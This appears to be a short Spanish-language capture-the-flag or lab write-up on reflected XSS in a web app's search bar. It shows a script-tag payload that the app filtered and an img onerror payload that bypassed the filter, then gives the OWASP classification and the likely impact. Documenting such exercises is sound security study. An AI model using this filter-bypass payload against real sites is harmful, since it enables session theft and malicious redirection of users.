**Reto: Reflected XSS**

URL objetivo: https://856k42qfe7.execute-api.us-east-1.amazonaws.com/prod/react#/home
Campo vulnerable: Barra de búsqueda (search bar)

Payload 1 (NO funcionó - filtrado por la app):
**<script>alert('1')</script>**

<img width="589" height="152" alt="image" src="https://github.com/user-attachments/assets/95abce2c-be7f-4e07-9ece-b343ede533f2" />


Payload 2 (SÍ funcionó - evadió el filtro):
**<img src='a' onerror=alert('xss')>**
<img width="589" height="252" alt="image" src="https://github.com/user-attachments/assets/536093c1-d92b-469a-939d-9f7124e17ff2" />

Clasificación OWASP: A03:2021 - Injection (Cross-Site Scripting)
Impacto: Ejecución de JavaScript arbitrario en el navegador de la víctima, 
posible robo de sesión, redirección maliciosa, o manipulación del DOM.
